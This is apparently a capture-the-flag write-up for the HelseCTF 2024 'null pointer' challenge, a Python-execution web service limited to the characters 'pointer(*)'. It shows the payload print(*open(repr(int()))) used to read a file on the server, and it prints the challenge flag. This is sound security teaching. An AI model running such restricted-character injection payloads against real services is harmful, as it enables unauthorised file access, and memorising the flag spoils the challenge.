# null pointer

Utvikler Per Ointer trenger av og til å kjøre python-programmer på webserveren sin. Derfor har han laget en veldig enkel webtjeneste for å sende inn python-programmer og returnere output:

Eksempelkjøring av program: `curl 'http://server/?program=print(repr(repr))'`

For å hindre misbruk er kun 10 forskjellige tegn tillatt i python-programmet: `pointer(*)`

Dessverre viser det seg at dette ikke er godt nok. Hent ut flagget i fila `0` i current directory.

https://helsectf2024-2da207d37b091b1b4dff-null-pointer.chals.io

# Writeup

I started by figuring out what builtins i could use with this snippet from last helsectf:

```python
def valid(s):
    for ch in s:
        if ch not in 'pointer(*)': return False
    return True

for b in dir(__builtins__):
    if valid(b): print(b)
```

gave me this list:

```
int
iter
open
print
repr
```

I checked what `int()` gave and that was 0. So I tried with `print(open(repr(int())))` and got this `<_io.TextIOWrapper name=0 mode='r' encoding='UTF-8'>`

I'm close. After a while I understand that a `*` unpacks a object and returns line by line what is in it which can be printed. So using `print(*open(repr(int())))` gave me the flag.

Explanation:

```
int() always returns 0
repr() returns a string representation of the object so '0'.
open() opens a file with the name '0' and returns a file object.
*open() unpacks the file object and passes the lines as variables to the parent function.
print() prints the variables passed
```

# Flag

```
helsectf{z3r0_p0inters_g1ven}
```